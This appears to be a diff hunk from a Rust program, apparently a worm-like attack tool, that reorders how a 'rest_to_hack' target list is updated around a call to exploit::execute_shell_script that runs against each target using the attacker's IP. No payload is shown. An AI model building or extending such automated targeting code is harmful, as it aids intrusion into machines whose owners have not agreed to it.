@@ -40,12 +40,13 @@ pub fn princip(my_ip: String) {
 
     }
 
+    let rest_to_hack = file_writing::pop_first_line_target();
+    file_writing::write_rest_to_hack(rest_to_hack);
+
     if find == false {
         exploit::execute_shell_script(&my_ip, &first_target_line);
         already_targeted_vector.push(first_target_line);
         file_writing::write_already_targeted(already_targeted_vector);
     }
-    let rest_to_hack = file_writing::pop_first_line_target();
-    file_writing::write_rest_to_hack(rest_to_hack);
 
 }
